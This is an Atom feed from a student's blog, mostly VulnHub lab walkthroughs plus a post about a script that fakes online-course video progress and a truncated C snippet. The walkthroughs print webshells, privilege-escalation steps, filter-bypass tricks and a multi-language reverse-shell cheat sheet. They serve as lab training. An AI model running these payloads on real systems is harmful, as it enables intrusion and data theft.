@@ -1,0 +1,678 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://yjn140.site</id>
+    <title>Microthink-yjn140</title>
+    <updated>2023-07-28T11:11:11.994Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://yjn140.site"/>
+    <link rel="self" href="https://yjn140.site/atom.xml"/>
+    <subtitle>博主本人是来自一所普通学校的大学生。平时喜欢各种科技数码类的新鲜事物，只要有能力，都想学习钻研一下。各大论坛的ID为“遇见你140”或“yjn140”</subtitle>
+    <logo>https://yjn140.site/images/avatar.png</logo>
+    <icon>https://yjn140.site/favicon.ico</icon>
+    <rights>All rights reserved 2023, Microthink-yjn140</rights>
+    <entry>
+        <title type="html"><![CDATA[出头科技九江学院刷课脚本]]></title>
+        <id>https://yjn140.site/oz2DgZtv8/</id>
+        <link href="https://yjn140.site/oz2DgZtv8/">
+        </link>
+        <updated>2023-05-31T16:02:16.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="出头科技九江学院刷课脚本">出头科技九江学院刷课脚本</h1>
+<p><u><strong>注意！此脚本仅用于技术交流，不得欺骗刷课，不得构造攻击！</strong></u><br>
+<u><strong>更不得卖钱！我看不起你！</u></strong></p>
+<p><s>官网给用户名密码登录界面加了个验证框，暂时不知道咋写代码解决，但是可以稍微改动一下代码就能用</s>（已解决）</p>
+<ol>
+<li>浏览器登录界面，查看cookies</li>
+<li>运行代码，分别输入cookies的两个参数的值<br>
+<img src="https://yjn140.site/post-images/1690542650553.png" alt="" loading="lazy"></li>
+</ol>
+<p><s>打包好的可执行程序下载：<a href="https://github.com/yjn140/superchutou-jjxy/releases">下载界面</a></s>（还没更新）</p>
+<p>使用方法</p>
+<ol>
+<li>
+<p>安装python环境</p>
+</li>
+<li>
+<p>使用pip命令安装requests库  <code>pip install requests</code></p>
+</li>
+<li>
+<p>运行这个脚本  <code>python chutou.py</code> 或者是 <code>python3 chutou.py</code></p>
+</li>
+<li>
+<p>输入用户名 回车 输入密码 回车</p>
+<hr>
+<p><img src="https://yjn140.site/post-images/1685548987305.jpg" alt="" loading="lazy"><br>
+<img src="https://yjn140.site/post-images/1685549382354.png" alt="" loading="lazy"></p>
+<p>写这个代码的初心是为了帮朋友，在网上找了个用户脚本发现用不了，追到他qq群发现软件要收费。然后别的渠道是50一学期的课，就好奇这么点玩意怎么好意思收费！<br>
+于是就花了一个晚上，大概是九点钟抓包，九点半摆烂进群求软件，发现收费开始认真研究。凌晨一点代码就写完了。<br>
+不得不说，chatGPT极大地帮助了我。根据我的描述出框架，根据每一个环节的请求和返回的响应完善每个函数代码。<br>
+大概逻辑就是登录拿到key，获取课程列表拿到课程code，获得课程视频的code，然后发送保存视频播放进度的请求。循环！循环！<br>
+代码简陋，能用就行。没有trycatch，没有加速，没有多线程，就图一个省事和安全</p>
+</li>
+</ol>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[bytes_to_long和long_to_bytes的一些见解]]></title>
+        <id>https://yjn140.site/8rH-KdoSN/</id>
+        <link href="https://yjn140.site/8rH-KdoSN/">
+        </link>
+        <updated>2022-09-23T14:37:56.000Z</updated>
+        <content type="html"><![CDATA[<p>首先在python里面from Crypto.Util.number import * 里面可以使用到这两个函数，简单来说是可以将字符串转换成一串数字和将一串数字转换成字符串。这种转换方法是有别于挨个转换成ascii码的<br>
+首先先说说bytes_to_long的作用。他在python里面是首先要对字符串进行编码使用的，即encode。将 'helloworld' 转换成 b'helloworld' 其实就是把python默认的UTF-8转换成bytes编码。完成这项操作后，我们使用bytes_to_long函数，发现对于单个字符，例如 'b'  他将转换成 98。即是他的ascii码，但是一旦变成 'bb' 就不是想象中的 9898 了。而是 25186 。经过查阅资料，发现实际上会对挨个字符进行移位处理。具体是先将每个字符转换成对应的ascii十进制值，然后转换成二进制，即bytes所谓的8位，如果不足则补全。那么对于 'bb' 会变成 01100010 01100010 然后连接起来就是110001001100010，那么把这个二进制数转换成十进制就是25186</p>
+<p>在上面我们说明白了正向的转换，那逆向过来也能更好一点地理解。针对一个十进制数，先将这个数转换成二进制数，然后从末尾八位数八位数转换成十进制数，然后在转换成ascii对应的字符。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[VulnHub靶场之DOUBLETROUBLE: 1]]></title>
+        <id>https://yjn140.site/NcBTaLTak/</id>
+        <link href="https://yjn140.site/NcBTaLTak/">
+        </link>
+        <updated>2022-07-12T16:08:46.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="vulnhub靶场doubletrouble">vulnhub靶场doubletrouble</h1>
+<p>首先是下载镜像，然后用vmware打开，记得关闭usb，然后网络配置建议设置成桥接模式，然后需要指定桥接的网卡。需要用同样的方法，修改网卡信息，这样才能分配到ip</p>
+<p>使用nmap进行扫描</p>
+<pre><code class="language-bash">sudo nmap -sP 192.168.[num1].1/24  
+</code></pre>
+<p>/24表示那个网段1-254都扫描</p>
+<p>然后对靶机的ip进行端口扫描</p>
+<pre><code class="language-bash">sudo nmap -P 192.168.[num1].[num2]
+</code></pre>
+<p>-sC 表示使用nmap脚本探测 -sV探测服务信息</p>
+<p>-p-表示扫描全端口</p>
+<p>扫出来开放了22和80端口</p>
+<p>访问80端口可以看到一个网页</p>
+<p>简单试一下admin这样的密码</p>
+<p>找一下网上看看有没有默认密码</p>
+<p>然后sqlmap试一下有没有注入</p>
+<p>发现没啥用</p>
+<p>然后</p>
+<pre><code class="language-bash">dirsearch -u http://192.168.2.9/
+</code></pre>
+<p>跑一下目录</p>
+<p>其实用gobuster也行，但是自己得有好字典，不然还不如dirsearch</p>
+<p>然后发现有若干cms常规路径</p>
+<p>比较令人好奇的是secret目录</p>
+<p>访问发现一张图</p>
+<p>用steghide检测一下有没有隐写</p>
+<pre><code class="language-bash">steghide --info doubletrouble.jpg
+</code></pre>
+<p>发现有隐写后，用stegseek加上字典跑一下</p>
+<p>mac上编译stegseek有点问题，我这用kali演示一下</p>
+<pre><code class="language-bash">gzip -d /usr/share/wordlists/rockyou.txt.gz
+</code></pre>
+<pre><code class="language-bash">stegseek dooubletrouble.jpg rockyou.txt 
+</code></pre>
+<p>发现账号和密码</p>
+<p>otisrush@localhost.com<br>
+otis666</p>
+<p>于是登陆看看</p>
+<p>发现个人资料的位置有一个上传文件的地方</p>
+<p>传一个冰蝎的shell看一下</p>
+<p>找到我们刚才跑目录跑出来的uploads路径，看一下有没有新文件</p>
+<p>发现我们上传的文件被重命名了</p>
+<p>用冰蝎连接一下</p>
+<p>可以看看基本的文件路径</p>
+<p>然后虚拟终端连接一下，看一看文件</p>
+<p>执行 sudo -l看一下权限信息</p>
+<p>发现有个awk不用输密码</p>
+<p>然后找了下awk的用法</p>
+<pre><code class="language-bash">sudo awk 'BEGIN {system(&quot;/bin/sh&quot;)}'
+</code></pre>
+<p>执行这个就能获得root权限</p>
+<p>然后进/root目录发现有一个系统镜像</p>
+<p>然后也没有别的线索了，就只能下载下来，在运行这个镜像</p>
+<p>刚好符合题目doubletrouble</p>
+<pre><code class="language-bash">python3 -m http.server 1234
+</code></pre>
+<p>然后同样的方法发现第二台靶机的ip和端口</p>
+<p>发现开放了22端口和80端口</p>
+<p>访问网页看看</p>
+<p>发现是一个表单</p>
+<p>打算试试sqlmap</p>
+<pre><code class="language-bash">sqlmap -u &quot;http://192.168.2.20/&quot;
+
+sqlmap -u &quot;http://192.168.2.20/&quot; -forms
+
+sqlmap -u &quot;http://192.168.2.20/&quot; -forms -dbs
+
+sqlmap -u &quot;http://192.168.2.20/&quot; -forms -D doubletrouble --tables
+
+sqlmap -u &quot;http://192.168.2.20/&quot; -forms -D doubletrouble -T users --dump
+</code></pre>
+<p>之后得到两个用户名和密码</p>
+<p>进行ssh尝试登录</p>
+<p>登录进去后，我们首先看到了user.txt</p>
+<p>然后我们简单看一下权限sudo -l</p>
+<p>发现没有sudo</p>
+<p>然后我们看一下网站的路径</p>
+<p>会发现有两个页面</p>
+<p>第二个页面pingit.php其实有命令执行漏洞，这个文件名可以从大字典跑出来，确定是有的。但是呢，他需要POST传两个参数。ip和submit</p>
+<pre><code class="language-php">&lt;?php
+
+print $_POST['ip'];
+if (isset($_POST['submit'])){
+        $target = $_REQUEST[ 'ip' ];
+        echo '&lt;pre&gt;';
+        echo shell_exec( 'ping -c 3 ' . $target );
+        echo '&lt;/pre&gt;';
+    }
+?&gt;
+</code></pre>
+<p>那么为了利用其中的shell_exec函数，需要首先if判断为真，得随便给submit传一个值。但是用hackbar传submit参数有问题，如果直接submit=1是会报错的，那如果写成Submit=1网上有人说可以，但是在这里，大小写不一样，参数就变了。所以我选择用postman。<code>ip=;ls&amp;submit=1</code>即可。既然这个也能用，甚至不需要密码就可以反弹shell了。值得一提的是，www文件夹没有写权限</p>
+<p>那么现在按照正常思路，需要提权</p>
+<p>看一下</p>
+<pre><code class="language-bash">uname -a
+</code></pre>
+<p>然后searchsploit linux 3.2</p>
+<p>发现可以用脏牛</p>
+<p>很多个提示能用的，然后我这边直接说其中一个能用的</p>
+<p>可以访问https://github.com/firefart/dirtycow/blob/master/dirty.c进行复制粘贴</p>
+<p>然后靶机没有git，也不支持wget下载刚才说的这个链接。当然可以用别的方法，比如本地开http服务，或者用端口传文件。最简单的就是用vi编辑器或者nano编辑器，这里vim没装</p>
+<p>然后按照注释</p>
+<pre><code class="language-bash">gcc -pthread dirty.c -o dirty -lcrypt
+</code></pre>
+<p>给生成的文件加一个执行权限</p>
+<pre><code class="language-bash">chmod +x dirty
+</code></pre>
+<p>然后执行他</p>
+<pre><code class="language-bash">./dirty
+</code></pre>
+<p>输入你设置的密码。等一会儿，然后切换用户</p>
+<pre><code class="language-bash">su firefart
+</code></pre>
+<pre><code class="language-bash">cat /root/root.txt
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[VulnHub靶场之BEELZEBUB: 1]]></title>
+        <id>https://yjn140.site/zJTL0sviV/</id>
+        <link href="https://yjn140.site/zJTL0sviV/">
+        </link>
+        <updated>2022-07-02T10:31:36.000Z</updated>
+        <content type="html"><![CDATA[<p>首先是下载镜像，然后用vmware打开，记得关闭usb，然后网络配置建议设置成桥接模式，然后需要指定桥接的网卡。</p>
+<p>使用nmap进行扫描</p>
+<pre><code class="language-bash">sudo nmap -sP 192.168.[num1].1/24  
+</code></pre>
+<p>/24表示那个网段1-254都扫描</p>
+<p>然后对靶机的ip进行端口扫描</p>
+<pre><code class="language-bash">sudo nmap -sC -sV -p- 192.168.[num1].[num2]
+</code></pre>
+<p>-sC 表示使用nmap脚本探测 -sV探测服务信息</p>
+<p>-p-表示扫描全端口</p>
+<p>扫出来开放了22和80端口</p>
+<p>访问80端口可以看到一个网页</p>
+<p>这个靶机很多信息隐藏在流量中，所以我这开着burp。这是个好习惯</p>
+<p>网页Apache</p>
+<p>试了下phpmyadmin</p>
+<p>然后我们也不知道什么网站结构 ，用dirb或者dirsearch扫</p>
+<p>因为我这边brew装不上dirb，然后我用pip装了dirsearch</p>
+<p>kali就没有这些问题，直接装</p>
+<pre><code class="language-bash">dirsearch -u http://192.168.2.34
+</code></pre>
+<p>扫出来有个index.php看一下，状态码是200，但是点进去是not found。有点问题，看一下源代码。看到了有个注释，关于beelzebub的md5值</p>
+<p>然后经过尝试，发现这个可能是网站的一个目录</p>
+<pre><code class="language-bash">dirsearch -u http://192.168.2.34/d18e1e22becbd915b45e0e655429d487
+</code></pre>
+<p>发现了wordpress</p>
+<p>那就用wpscan扫一下</p>
+<p>找到了两个用户，一个上传目录泄漏</p>
+<p>记录下用户名，这个会跟我们的ssh有关系，因为需要用户名和密码</p>
+<p>然后访问一下wordpress首页。发现打不开</p>
+<p>在burp上发现浏览器向192.168.1.6地址请求css等文件，于是我拦截请求与响应。把全部1.6改成2.34.于是就访问了页面。但是并没有发现什么有用的信息。</p>
+<p>于是返回来看看那个目录泄漏</p>
+<p>其中有一个文件夹点进去，有一个页面。大概就是说跟恶魔打招呼，你找不到啥有用的信息。但是在请求的cookie里面，有一个password。于是尝试ssh连接靶机</p>
+<p>连接上后，看一下位置在哪</p>
+<pre><code class="language-bash">pwd
+</code></pre>
+<p>然后</p>
+<pre><code class="language-bash">uname -a
+</code></pre>
+<p>看了下系统版本 18.04</p>
+<p>想在searchsploit搜索一下，发现那个提权的首先需要root权限运行，这就有点莫名其妙</p>
+<p>然后看看有啥内容</p>
+<pre><code class="language-bash">ls -la
+</code></pre>
+<p>发现有一个.bash_history</p>
+<p>cat 查看一下</p>
+<p>看到了他在www.exploit-db.com竟然下载了一个东西。于是在靶机上下载下来，猜测这东西能用来提权</p>
+<p>然后想着用rname进行改名，加一个后缀。发现没装。于是用mv</p>
+<p>改完之后，gcc编译。这些步骤其实可以看那个.bash-history文件内容，会有所启发</p>
+<p>然后</p>
+<pre><code class="language-bash">chmod +x a.out
+./a.out
+pwd
+</code></pre>
+<p>发现是root权限</p>
+<pre><code class="language-bash">cat /root/root.txt
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[VulnHub靶场之JANGOW: 1.0.1]]></title>
+        <id>https://yjn140.site/PTm3MJV-x/</id>
+        <link href="https://yjn140.site/PTm3MJV-x/">
+        </link>
+        <updated>2022-07-02T09:11:33.000Z</updated>
+        <content type="html"><![CDATA[<p>首先是下载镜像，然后用vmware打开，记得关闭usb，然后网络配置建议设置成桥接模式，然后需要指定桥接的网卡。</p>
+<p>这样对于这个镜像还不够，需要改网卡配置。详情看另外一个视频</p>
+<p>使用nmap进行扫描</p>
+<pre><code class="language-bash">sudo nmap -sP 192.168.[num1].1/24  
+</code></pre>
+<p>/24表示那个网段1-254都扫描</p>
+<p>然后对靶机的ip进行端口扫描</p>
+<pre><code class="language-bash">sudo nmap -sC -sV -p- 192.168.[num1].[num2]
+</code></pre>
+<p>-sC 表示使用nmap脚本探测 -sV探测服务信息</p>
+<p>-p-表示扫描全端口</p>
+<p>扫出来开放了21和80端口</p>
+<p>访问80端口可以看到一个网页</p>
+<p>可以看到有一个任意命令执行漏洞</p>
+<pre><code class="language-bash">echo '&lt;?php eval($_POST[&quot;hacker&quot;]);' &gt; hacker.php
+</code></pre>
+<p>蚁剑连接一下</p>
+<p>检查文件目录</p>
+<p>/var/www/html/site/wordpress</p>
+<p>除此之外发现在/var/www/html下有一个./backup文件</p>
+<p>然后21端口，用浏览器访问一遍，然后再连接一遍</p>
+<p>发现能访问的目录是一样的，也就没啥用</p>
+<p>现在就要反弹shell</p>
+<p>这个靶机是对端口有限制的，只能用443端口。怎么判断出来的呢，两个办法。一个是因为他有网站相关服务，80端口443端口对应http和https，所以一般不会做限制。第二个办法就是利用脚本，每个端口都试一遍。而攻击机只需要把所有端口的流量都转到一个端口</p>
+<pre><code class="language-bash">sudo iptables -A PREROUTING -t nat -p tcp --dport 1:65535 -j REDIRECT --to-port 1234
+nc -lvvp 1234
+</code></pre>
+<p>通过测试，发现只有443端口能用，则执行</p>
+<pre><code class="language-php">&lt;?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.1.[num] 443 &gt;/tmp/f');?&gt;
+</code></pre>
+<p>kali</p>
+<pre><code class="language-bash">nc -lvvp 443
+</code></pre>
+<p>Mac 得使用下面这个</p>
+<pre><code class="language-bash">nc -l 443
+</code></pre>
+<p>用这个升级一下bash功能</p>
+<pre><code class="language-bash">python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<p>看一下系统版本</p>
+<pre><code class="language-bash">uname -a
+cat /proc/version
+</code></pre>
+<pre><code class="language-bash">searchsploit linux kernel 4.4
+
+searchsploit ubuntu16.04
+</code></pre>
+<p>找到这个45010.c文件，传到靶机，然后</p>
+<pre><code class="language-bash">gcc 45010.c
+
+chmod +x a.out
+
+./a.out
+
+whomi
+
+cat /root/proof.txt
+</code></pre>
+<p>443</p>
+<p>ss</p>
+<p>netstat -aptn</p>
+<p>php -r '$sock=fsockopen(&quot;192.168.2.199&quot;,3306);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[VulnHub靶场之THE PLANETS: EARTH]]></title>
+        <id>https://yjn140.site/gI4SR2RRz/</id>
+        <link href="https://yjn140.site/gI4SR2RRz/">
+        </link>
+        <updated>2022-06-23T03:52:49.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="vulnhub靶场earth">vulnhub靶场Earth</h1>
+<p>首先是下载镜像，然后用vmware打开，记得关闭usb，然后网络配置建议设置成桥接模式，然后需要指定桥接的网卡。</p>
+<p>使用nmap进行扫描</p>
+<pre><code class="language-bash">sudo nmap -sP 192.168.[num1].1/24  
+</code></pre>
+<p>/24表示那个网段0-255都扫描</p>
+<p>然后对靶机的ip进行端口扫描</p>
+<pre><code class="language-bash">sudo nmap -sC -sV -p- 192.168.[num1].[num2]
+</code></pre>
+<p>-sC 表示使用nmap脚本探测 -sV探测服务信息</p>
+<p>-p-表示扫描全端口</p>
+<p>从图可以看到开启了22 80 443 端口，然后用到了两个dns服务器 earth.local  terra test.earth.local</p>
+<p>然后我们正常访问这个网站ip地址，发现访问不了</p>
+<p>即一台服务器，有两个域名，有可能这里用了apache的虚拟主机技术，不同的域名指向不同的服务器目录，或者有不同的权限</p>
+<p>方便起见，这个时候我们改本机的hosts文件</p>
+<pre><code class="language-bash">vi /etc/hosts 
+</code></pre>
+<pre><code>192.168.1.241 earth.local terratest.earth.local
+</code></pre>
+<p>然后，碰到ssl端口开放，我们可能就要考虑到https和http访问得到的网站权限可能不一样</p>
+<p>然后因为证书问题，chrome内核可能访问不了，我们只需要在该标签页，键盘拼写thisisunsafe，即自动刷新。safari则只需同意一下</p>
+<p>然后在网站上访问的输入框会使得页面多一行文本，没啥思路。</p>
+<p>于是开始扫目录</p>
+<p>网上教程一个域名是扫描http，一个域名是扫描https。那我说不出为什么这样的道理，我只能每个域名的http和https都建议扫一下，那么两个域名就是扫四次</p>
+<p>使用gobuster 3.0</p>
+<p>用法</p>
+<pre><code class="language-bash">gobuster dir -u 目标地址 -w 字典 -x .zip,.php,.txt      
+</code></pre>
+<p>字典用的是御剑的，勉强够用。有个一百多兆的，一晚上根本扫不完，还没啥用</p>
+<p>gobuster dir -u http://earth.local -w /Users/song/Data/渗透/字典/dir.txt -x .zip,.php,.txt</p>
+<p>gobuster dir -u https://earth.local -w /Users/song/Data/渗透/字典/dir.txt -x .zip,.php,.txt</p>
+<p>gobuster dir -u http://terratest.earth.local -w ../dicts.txt -x .zip,.php,.txt -k</p>
+<p>gobuster dir -u https://terratest.earth.local -w ../dicts.txt -x .zip,.php,.txt -k</p>
+<p>然后找到几个路径</p>
+<p>http://earth.local/admin/login</p>
+<p>网上说爆破没用，我还不太会用burp的混合爆破。既然没用，但是我觉得能不能通过构造的方法试试，下次找个机会试试。当然也得考虑从网站别处弄到手</p>
+<p>https://terratest.earth.local/robots.txt</p>
+<p>这里规定了一些不让抓取的路径或者说文件类型</p>
+<p>发现比较特殊的是/testingnotes.*</p>
+<p>猜测为txt文件，当然什么.md .doc .docx都可以试试</p>
+<p>查看了一下，发现有点信息</p>
+<p>测试安全消息系统注意事项：<br>
+*使用 XOR 加密作为算法，在 RSA 中使用应该是安全的。<br>
+*地球已确认他们已收到我们发送的消息。<br>
+*testdata.txt 用于测试加密。<br>
+*terra 用作管理门户的用户名。<br>
+去做：<br>
+*我们如何安全地将我们的每月密钥发送到地球？ 还是我们应该每周更换密钥？<br>
+*需要测试不同的密钥长度以防止暴力破解。 钥匙应该多长？<br>
+*需要改进消息界面和管理面板的界面，目前非常基础。</p>
+<p>这里可以看出又提到了一个tesedata.txt文件，我们想办法下载下来。</p>
+<p>如果使用wget，那需要在后面带参数--no-check-certificate</p>
+<p>因为那个https的ssl证书不被认可</p>
+<pre><code class="language-bash">wget https://terratest.earth.local/testdata.txt --no-check-certificate
+</code></pre>
+<p>根据文中提到的xor异或加密算法，目前来收我们在网站上可以看到一开始的三串字符串，这个就是所谓发送给地球的信息，我们也测试了一次。那么我们现在已知（被加密了的信息和加密算法材料，也许可以得出原信息）</p>
+<p>这里就要了解一下异或加密与解密的知识——大概就是知二求一</p>
+<p>现在可以通过异或算法解密出原始数据</p>
+<p>利用testdata.txt和三组原始加密信息进行解密，在第三组信息中得到了一个重复字符串 earthclimatechangebad4humans</p>
+<p>然后我们就用这个作为密码，terra作为用户名，http://earth.local/admin/login这里登陆进了网站后台</p>
+<p>发现这个有个文本框能够直接执行命令</p>
+<p>那么最常见的，ls /var 看一下，然后pwd。whoami</p>
+<p>然后因为有两个flag，现在先用find命令找一下。</p>
+<pre><code class="language-bash">find / -name &quot;*flag*&quot; 
+</code></pre>
+<pre><code class="language-bash">find / -name &quot;*earth*&quot;
+</code></pre>
+<p>找到一个/var/earth_web/user_flag.txt</p>
+<pre><code class="language-bash">cat /var/earth_web/user_flag.txt
+</code></pre>
+<p>得到一个flag：user_flag_3353b67d6437f07ba7d34afd7d2fc27d</p>
+<p>那么根据vulunhub说的，有user_flag和root_flag，也就是说我们现在这个apache用户权限不太够，有些文件访问不了，则我们需要提权</p>
+<p>两个思路，一个是提升现在用户的权限，另外一个是使用高权限用户，例如root用户来执行一些命令。</p>
+<p>那么涉及到很多命令的执行，为了更方便，我们选择反弹shell来连接该主机</p>
+<p>然后反弹shell大致分为bash nc talent三种实现方法，然后针对不同语言的web服务器，还可以使用一些脚本反弹shell，例如</p>
+<pre><code class="language-python">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;x.x.x.x&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);'
+</code></pre>
+<pre><code class="language-perl">perl -e 'use Socket;$i=&quot;x.x.x.x&quot;;$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
+</code></pre>
+<pre><code class="language-perl">perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;x.x.x.x:5555&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
+</code></pre>
+<pre><code class="language-ruby">ruby -rsocket -e 'exit if fork;c=TCPSocket.new(&quot;x.x.x.x&quot;,&quot;5555&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end'
+</code></pre>
+<pre><code class="language-php">php -r '$sock=fsockopen(&quot;x.x.x.x&quot;,5555);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
+</code></pre>
+<pre><code class="language-java">	public class Revs {
+	/**
+	* @param args
+	* @throws Exception 
+	*/
+	public static void main(String[] args) throws Exception {
+  	  // TODO Auto-generated method stub
+    	Runtime r = Runtime.getRuntime();
+    	String cmd[]= {&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;};
+    	Process p = r.exec(cmd);
+    	p.waitFor();
+	}
+}
+</code></pre>
+<pre><code class="language-lua">lua -e &quot;require('socket');require('os');t=socket.tcp();t:connect('x.x.x.x','5555');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');&quot;
+</code></pre>
+<pre><code class="language-bash">awk 'BEGIN{s=&quot;/inet/tcp/0/x.x.x.x/8080&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)}'
+</code></pre>
+<p>那我们从一般步骤开始尝试</p>
+<p>首先是攻击机开启监听</p>
+<p>kali</p>
+<pre><code class="language-bash">nc -lvvp 1234
+</code></pre>
+<p>Mac 得使用下面这个</p>
+<pre><code class="language-bash">nc -l 1234
+</code></pre>
+<p>然后让靶机反弹shell</p>
+<p>我们先 ls /usr/bin 看一下能执行什么命令，发现bash nc python是可以使用的</p>
+<p>那就尝试这几个命令</p>
+<pre><code class="language-bash">bash -i &gt;&amp; /dev/tcp/192.168.1.123/1234 0&gt;&amp;1
+</code></pre>
+<pre><code class="language-python">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.123&quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);' 
+</code></pre>
+<p>这个python代码有长度限制（maxlength），需要改前端限制，或者抓包改数据</p>
+<p>后面发现都没用</p>
+<p>根据网上教程的提示，意思是说会对命令中ip地址的数字进行过滤（正则表达式）</p>
+<p>这里我把那个代码文件提取出来，可以了看一下</p>
+<p>然后我们使用16进制对十进制的ip地址进行编码</p>
+<pre><code class="language-bash">bash -i &gt;&amp; /dev/tcp/0xc0.0xa8.0x01.0x67/1234 0&gt;&amp;1
+</code></pre>
+<p>也有别的教程是把ip点十进制转成2进制，然后按权重加起来，也可以实现绕过的效果</p>
+<p>正常情况就连接上了，用ls pwd可以测试一下</p>
+<p>然后用命令找一些有特殊权限的文件</p>
+<pre><code class="language-bash">find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre>
+<p>或者</p>
+<pre><code class="language-bash">find / -perm /u=s -type f 2&gt;/dev/null
+</code></pre>
+<p>然后</p>
+<pre><code class="language-bash">/usr/bin/chage /usr/bin/gpasswd /usr/bin/newgrp /usr/bin/su /usr/bin/mount /usr/bin/umount /usr/bin/pkexec /usr/bin/passwd /usr/bin/chfn /usr/bin/chsh /usr/bin/at /usr/bin/sudo /usr/bin/reset_root /usr/sbin/grub2-set-bootflag /usr/sbin/pam_timestamp_check /usr/sbin/unix_chkpwd /usr/sbin/mount.nfs /usr/lib/polkit-1/polkit-agent-helper-1
+</code></pre>
+<p>注意到这个/usr/bin/reset_root</p>
+<p>直接运行发现报错</p>
+<p>所以我们决定把它提取出来，通过逆向或者进行调试</p>
+<p>那我们就得用一种方式把它提取。</p>
+<p>这里我们选择nc命令，在另外一个端口，由靶机把文件作为数据流发送给攻击机，然后攻击机把收到的数据保存到文件中。也就实现了文件的提取</p>
+<p>攻击机：nc -l 4321 &gt;reset_root</p>
+<p>靶机shell:nc 192.168.1.123 4321 &lt; /usr/bin/reset_root</p>
+<p>提取出来之后，放到ida里面逆向看一下，大概来说就是有个变量每通过一次函数，就会自增1，当着个变量等于3时，就会执行重置root密码的操作</p>
+<p>那么根据网上的提示，我们选择来kali这样的linux系统中通过ltrace或者strace对程序进行跟踪，看一下他到底需要哪三个判断。</p>
+<p>sudo chmod +x reset_root</p>
+<p>这里我自己通过逆向不是很清楚文件和路径怎么就能得出来，水平有限，希望大佬解答</p>
+<p>然后就会发现需要三个文件，但是找不到。那我们就使用touch命令，在相应目录创建三个文件。</p>
+<p>ltrace 进程库函数调用</p>
+<p>strace在<a href="https://so.csdn.net/so/search?q=linux&amp;spm=1001.2101.3001.7020">linux</a>下用来跟踪某个进程的系统调用。 系统调用</p>
+<p>然后我们再在靶机执行这个程序，发现就把root用户密码改成了Earth</p>
+<p>那我们用su命令切换到root，输入密码。即成功切换</p>
+<p>然后还是执行find命令，找到rootflag</p>
+<p>root_flag_b0da9554d29db2117b02aa8b66ec492e</p>
+<p>在solaris下，对应的是dtrace</p>
+<p>在mac下，对应的命令是：dtruss</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[c语言统计字符串26字母词频]]></title>
+        <id>https://yjn140.site/sqSbKkVP3/</id>
+        <link href="https://yjn140.site/sqSbKkVP3/">
+        </link>
+        <updated>2021-12-15T15:01:23.000Z</updated>
+        <summary type="html"><![CDATA[<h1 id="猜单词">猜单词</h1>
+<p>//显然我想复杂了,但是在这里我自己第一次尝试了下结构体+数组,双重循环如何从内层直接退出的写法,我觉得很有意思.</p>
+]]></summary>
+        <content type="html"><![CDATA[<h1 id="猜单词">猜单词</h1>
+<p>//显然我想复杂了,但是在这里我自己第一次尝试了下结构体+数组,双重循环如何从内层直接退出的写法,我觉得很有意思.</p>
+<!-- more -->
+<pre><code class="language-c">
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+typedef struct
+{
+	char strchar;
+	int valuestr;
+} strstruct;
+
+strstruct chuan[28];
+
+int shifouzhishu(int i)
+{
+	int j = 2;
+	for (; j &lt;= i; j++)
+	{
+		if (i % j == 0)
+			break;
+	}
+	if (j != i)
+		return 0; 
+	else
+		return 1;
+}
+
+int main()
+{
+	char maxc;
+	int maxs;
+	char minc;
+	int mins;
+	char str[101];
+	gets(str);
+	int ii = 0;
+	int a = 0;
+	for (int i = 0; i &lt; strlen(str); i++)
+	{
+		for (int j = 0; j &lt;= 100; j++)
+		{
+			if (chuan[j].strchar == str[i])
+			{
+				chuan[j].valuestr++;
+				a = 1;
+			}
+		}
+		if (a == 1)
+		{
+			a = 0;
+			continue;
+		}
+		else
+			a = 0;
+		chuan[ii].strchar = str[i];
+		chuan[ii].valuestr = 1;
+		ii++;
+	}
+	maxc = chuan[0].strchar;
+	minc = chuan[0].strchar;
+	mins = chuan[0].valuestr;
+	maxs = chuan[0].valuestr;
+	for (int i = 1; i &lt; ii; i++)
+	{
